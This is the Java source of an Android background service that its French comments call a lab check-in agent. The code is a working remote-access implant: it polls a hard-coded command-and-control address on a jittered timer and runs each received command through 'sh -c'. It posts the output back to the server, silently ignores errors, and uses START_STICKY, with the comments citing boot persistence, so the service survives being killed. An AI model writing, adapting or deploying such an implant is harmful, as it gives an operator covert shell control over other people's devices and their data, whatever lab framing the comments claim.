// package com.lexcorp.lexservice - service de check-in Android (lab autorise)
// exec de taches envoyees par le C2, reconnexion, boot persistence via BootReceiver
package com.lexcorp.lexservice;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

public class LexService extends Service {
    private String c2 = "http://192.168.1.222:8090"; // IP a regler avant le build
    private String id = "lex-" + new Random().nextInt(999);
    private volatile boolean running = true;

    @Override
    public IBinder onBind(Intent i) { return null; }

    @Override
    public int onStartCommand(Intent i, int flags, int startId) {
        new Thread(() -> {
            while (running) {
                try {
                    String cmd = httpGet(c2 + "/?id=" + id);
                    if (cmd != null && !cmd.equals("noop") && !cmd.isEmpty()) {
                        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = r.readLine()) != null && sb.length() < 4000) sb.append(line).append("\n");
                        httpPost(c2, id, sb.toString());
                    }
                } catch (Exception ignored) { }
                sleep(10000 + new Random().nextInt(5000));
            }
        }).start();
        return START_STICKY;   // le systeme relance si tue
    }

    private String httpGet(String u) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
        BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String l; while ((l = r.readLine()) != null) sb.append(l);
        return sb.toString();
    }

    private void httpPost(String u, String agent, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
        c.setRequestMethod("POST");
        c.setRequestProperty("X-Agent", agent);
        c.setDoOutput(true);
        c.getOutputStream().write(body.getBytes());
        c.getInputStream().read();
    }

    private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception ignored) { } }

    @Override
    public void onDestroy() { running = false; }
}
